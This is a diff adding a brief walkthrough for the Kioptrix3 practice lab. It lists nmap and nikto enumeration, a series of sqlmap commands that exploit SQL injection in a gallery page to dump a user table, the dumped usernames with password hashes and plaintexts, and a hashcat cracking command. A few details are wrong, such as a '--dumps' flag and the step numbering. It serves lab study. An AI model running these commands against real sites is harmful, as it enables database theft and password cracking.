@@ -1,0 +1,41 @@
+Kioptix3 
+------------------
+
+Perform nmap scan and then you will see two ports open 22 and 80
+
+ennumerate more web port using nikto, dibuster etc.
+
+you will find the vulnerable database which is identified by the below link.
+
+http://kioptrix3.com/gallery/gallery.php?id=1%20&%20sort=filename#photos
+
+run below sqlmap commands to get more info about database query injectable vulnerability
+
+1. sqlmap -u http://kioptrix3.com/gallery/gallery.php?id=1%20&%20sort=filename#photos --dbms=MySQL
+
+2. sqlmap -u http://kioptrix3.com/gallery/gallery.php?id=1%20&%20sort=filename#photos --dbms=MySQL --dbs
+
+3. sqlmap -u http://kioptrix3.com/gallery/gallery.php?id=1%20&%20sort=filename#photos -D gallery --tables
+
+4. sqlmap -u http://kioptrix3.com/gallery/gallery.php?id=1%20&%20sort=filename#photos -D gallery -T dev_accounts --dumps
+
+After the 3rd command you will get the below information
+
+
+ id | username   | password                         |
++----+------------+----------------------------------+
+| 1  | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 |Mast3r
+| 2  | loneferret | 5badcaf789d3d1d09794d8f021f40f0e |starwars
+
+Crack the above password using any hashing algorithm.
+
+hashcat -a 0 -m 0 filename wordlist
+
+
+
+
+
+
+
+
+
